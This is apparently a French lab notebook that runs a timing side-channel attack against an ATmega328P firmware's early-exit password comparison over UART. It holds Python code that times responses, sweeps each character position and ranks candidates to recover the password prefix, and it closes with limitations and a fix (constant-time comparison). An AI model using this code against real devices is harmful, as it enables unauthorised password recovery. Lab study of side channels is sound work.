# Timing attack — ATmega328P / UART

**Objectif :** analyser la fuite temporelle de `early_exit_compare()` sur la cible de laboratoire, sans utiliser le mot de passe connu dans le code source.

**Attention :** dans le firmware fourni, `delayMicroseconds(50)` est commenté. La variation de durée de la comparaison peut être bien plus petite que la gigue USB/UART. Un classement instable **ne constitue pas une récupération fiable**. Pour un meilleur déclenchement, une mesure matérielle entre l'arrivée du dernier bit UART et le front de réponse ou un trigger matériel est préférable.

Matériel : ATmega328P sur breadboard avec alimentation, oscillateur, reset et UART correctement câblés. Ce notebook ne programme ni ne flashe le microcontrôleur.

**Liaisons CW-Nano → cible :** GND pin 2 → masse ; VREF pin 8 → 5 V cible ; RX pin 10 → D11 / DIP17 (TX du firmware) ; TX pin 12 → D10 / DIP16 (RX du firmware). VREF est une référence, pas l'alimentation. Les UART se croisent. Configuration 9600 bauds, 8N1.

**Alternative USB-UART :** TX adaptateur → D10, RX adaptateur ← D11 et masse commune. Ne connectez pas en parallèle deux sorties TX.


## 1 — Imports et paramètres

In [1]:
# Si nécessaire dans Jupyter :
# %pip install chipwhisperer pyserial numpy pandas matplotlib
import time, random, string, statistics
from pathlib import Path
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt

BACKEND = "chipwhisperer"   # ou "pyserial" si adaptateur USB-UART
PORT = "COM12"              # seulement si BACKEND="pyserial"
BAUD = 9600
PASSWORD_LENGTH = 8        # hypothèse expérimentale ; peut être modifiée
ALPHABET = string.ascii_letters + string.digits + string.punctuation
FILLER = "a"
REPEATS = 15               # commencer petit puis augmenter après validation
TIMEOUT_S = 1.5
SEED = 1234
OUT = Path("timing_results")
OUT.mkdir(exist_ok=True)


## 2 — Connexion au matériel

Pour ChipWhisperer, utilise l’UART brut comme dans le PDF. Le firmware GPIO High-Z mentionné par le PDF doit être préparé suivant sa procédure si requis par ton Nano. Cette cellule **ne le téléverse pas**. Ferme le Serial Monitor Arduino avant de lancer le notebook.

In [2]:
scope = None
cw_target = None
serial_port = None
if BACKEND == "chipwhisperer":
    import chipwhisperer as cw
    try:
        scope = cw.scope()
    except OSError as exc:
        raise RuntimeError(
            "Le ChipWhisperer est déjà utilisé par un autre notebook ou processus. "
            "Ferme les autres connexions, redémarre le noyau Jupyter, puis relance cette cellule."
        ) from exc
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    cw_target = cw.target(scope, cw.targets.SimpleSerial2)
    cw_target.baud = BAUD
    link = cw_target.ser
else:
    import serial
    serial_port = serial.Serial(PORT, BAUD, timeout=0.05, write_timeout=1)
    link = serial_port
print("Connexion initialisée :", BACKEND, BAUD, "baud")


Connexion initialisée : chipwhisperer 9600 baud


## 3 — Fonctions UART et mesure

La durée est prise juste avant l’envoi et arrêtée au **premier octet reçu**. La réponse est ensuite lue jusqu’au prompt suivant afin de synchroniser les essais. Un délai fixe lié à la transmission reste inclus. Une erreur de synchronisation invalide la mesure.

In [3]:
PROMPT = b"Enter password:"
DENIED = b"ACCESS DENIED"
GRANTED = b"ACCESS GRANTED"

def read_byte():
    value = link.read(1)
    if isinstance(value, str):
        value = value.encode("latin1")
    return bytes(value)

def read_until_prompt(timeout_s=TIMEOUT_S, initial=b""):
    buf = bytearray(initial)
    deadline = time.perf_counter() + timeout_s
    while PROMPT not in buf and time.perf_counter() < deadline:
        piece = read_byte()
        if piece:
            buf.extend(piece)
    return bytes(buf), PROMPT in buf

def synchronize(timeout_s=2.0):
    # Demande non vide pour forcer une réponse et un nouveau prompt.
    link.write(b"?\n")
    result, ok = read_until_prompt(timeout_s)
    if not ok:
        raise TimeoutError(f"Prompt UART introuvable. Reçu : {result!r}")
    return result

def probe(candidate):
    if not candidate or any(ch in '\r\n' for ch in candidate):
        raise ValueError("Candidat non valide")
    payload = (candidate + "\n").encode("ascii")
    t0 = time.perf_counter_ns()
    link.write(payload)
    first = read_byte()
    t1 = time.perf_counter_ns()
    response, synced = read_until_prompt(initial=first)
    status = "granted" if GRANTED in response else "denied" if DENIED in response else "unknown"
    return {"candidate": candidate, "elapsed_us": (t1-t0)/1000,
            "status": status, "synced": synced, "response": response.decode("latin1", errors="replace")}


## 4 — Test de communication (obligatoire avant la campagne)

In [4]:
print("Synchronisation :", repr(synchronize()[:150]))
test = probe("Z" * PASSWORD_LENGTH)
print(test)
assert test["synced"] and test["status"] in {"denied", "granted"}, "UART non synchronisé"


TimeoutError: Prompt UART introuvable. Reçu : b''

## 5 — Vérification de la stabilité des mesures

In [ ]:
pilot = [probe("Z" * PASSWORD_LENGTH) for _ in range(30)]
pilot_df = pd.DataFrame(pilot)
display(pilot_df[["elapsed_us", "status", "synced"]].describe(include="all"))
plt.figure(figsize=(10,3))
plt.plot(pilot_df.elapsed_us, '.-')
plt.ylabel("Temps jusqu’au 1er octet (µs)")
plt.xlabel("Essai")
plt.title("Bruit et dérive de la mesure")
plt.grid(alpha=.3)
plt.show()


## 6 — Mesure d’une position du mot de passe

L’ordre des caractères est mélangé à chaque répétition. La longueur totale est conservée fixe, comme dans ton script précédent. On enregistre les données brutes, et pas seulement la médiane. **Important :** le meilleur candidat est une hypothèse, pas une preuve.

In [ ]:
def make_candidate(prefix, char):
    if len(prefix) >= PASSWORD_LENGTH:
        raise ValueError("Préfixe trop long")
    return prefix + char + FILLER * (PASSWORD_LENGTH - len(prefix) - 1)

def sweep_position(prefix="", repeats=REPEATS, alphabet=ALPHABET):
    rng = random.Random(SEED + len(prefix))
    rows = []
    for cycle in range(repeats):
        order = list(alphabet)
        rng.shuffle(order)
        for char in order:
            sample = probe(make_candidate(prefix, char))
            sample.update(position=len(prefix), prefix=prefix, char=char, cycle=cycle)
            rows.append(sample)
        print(f"Position {len(prefix)+1} : cycle {cycle+1}/{repeats}", end="\r")
    print()
    raw = pd.DataFrame(rows)
    if not raw.synced.all() or (raw.status == "unknown").any():
        print("ATTENTION : erreurs UART détectées, campagne possiblement invalide")
    safe_prefix = ''.join(ch if ch.isalnum() else '_' for ch in prefix) or 'empty'
    raw.to_csv(OUT / f"raw_pos{len(prefix)+1}_{safe_prefix}.csv", index=False)
    valid = raw[(raw.synced) & (raw.status.isin(["denied", "granted"]))]
    rank = valid.groupby("char").elapsed_us.agg(['count','median','mean','std']).sort_values('median', ascending=False)
    return raw, rank

# Première position :
raw, ranking = sweep_position(prefix="", repeats=REPEATS)
display(ranking.head(15))


## 7 — Graphiques et contrôle statistique

On visualise les dix premiers candidats et la dispersion de leurs mesures. Si les distributions se recouvrent, il faut augmenter le nombre de mesures ou changer de méthode d’acquisition.

In [ ]:
top = ranking.head(10).index.tolist()
plt.figure(figsize=(11,4))
data = [raw.loc[(raw.char == ch) & raw.synced, 'elapsed_us'].values for ch in top]
plt.boxplot(data, tick_labels=[repr(x) for x in top], showfliers=False)
plt.ylabel("Temps (µs)")
plt.xlabel("Caractère testé")
plt.title("Dix candidats les plus lents — distributions")
plt.grid(axis='y', alpha=.3)
plt.show()
if len(ranking) > 1:
    best, second = ranking.iloc[0], ranking.iloc[1]
    print('Écart des médianes (1er - 2e) :', round(best['median'] - second['median'], 2), 'µs')
    print('1er :', repr(ranking.index[0]), '| 2e :', repr(ranking.index[1]))


## 8 — Récupération itérative supervisée

Après avoir validé expérimentalement le classement, ajouter **manuellement** le caractère choisi au préfixe, puis refaire une acquisition. Ne pas valider automatiquement huit caractères sur la base d’un seul classement bruité.

In [ ]:
PREFIX = ""    # Remplacer après chaque validation expérimentale, ex. "f" (exemple fictif)
# Décommenter pour tester la position suivante :
# raw_next, ranking_next = sweep_position(prefix=PREFIX, repeats=REPEATS)
# display(ranking_next.head(15))


## 9 — Contrôle positif/négatif (si tu disposes d’un préfixe confirmé)

Une fois un caractère validé, comparer un candidat commençant par le préfixe correct à un autre avec un premier caractère volontairement incorrect, en entrelaçant les mesures. Cette étape aide à détecter les faux positifs.

In [ ]:
def compare_controls(candidate_a, candidate_b, repeats=50):
    rng = random.Random(SEED)
    samples=[]
    for i in range(repeats):
        names = [("A",candidate_a),("B",candidate_b)]
        rng.shuffle(names)
        for label, candidate in names:
            r=probe(candidate)
            r.update(label=label, cycle=i)
            samples.append(r)
    df=pd.DataFrame(samples)
    display(df.groupby('label').elapsed_us.agg(['median','mean','std','count']))
    return df
# controls = compare_controls("a" + FILLER * 7, "Z" + FILLER * 7)


## 10 — Nettoyage de la connexion

In [ ]:
if cw_target is not None:
    cw_target.dis()
if scope is not None:
    scope.dis()
if serial_port is not None:
    serial_port.close()
print("Connexions fermées")


## Interprétation et limitations

- Le code source fourni compare bien chaque caractère dans `early_exit_compare()` et s’arrête au premier caractère erroné.
- Le protocole utilise `SoftwareSerial(10,11)` à 9600 bauds ; le `Serial` à 115200 sert seulement à la console distincte.
- Le script Python initial envoyait des requêtes sur COM12 et ne conservait que les résultats `ACCESS DENIED`. Son échec peut venir de l’échelle temporelle trop faible, de la gigue de lecture USB, de pertes de synchronisation ou d’une liaison UART différente.
- La temporisation artificielle de 50 µs est désactivée dans ce firmware ; les différences de microsecondes, voire inférieures, ne sont pas forcément observables via Python/USB.
- Pour rendre cette expérience reproductible : mesurer directement les transitions matérielles au moyen d’un oscilloscope/analyseur logique, ou instrumenter une **version de laboratoire** avec trigger avant/après la comparaison. Ne pas confondre le temps de transmission d’une réponse et la durée de comparaison.
- Correctif à discuter dans le rapport : comparaison sans sortie anticipée, stratégie d’accès limitée, et validation sur le code compilé.
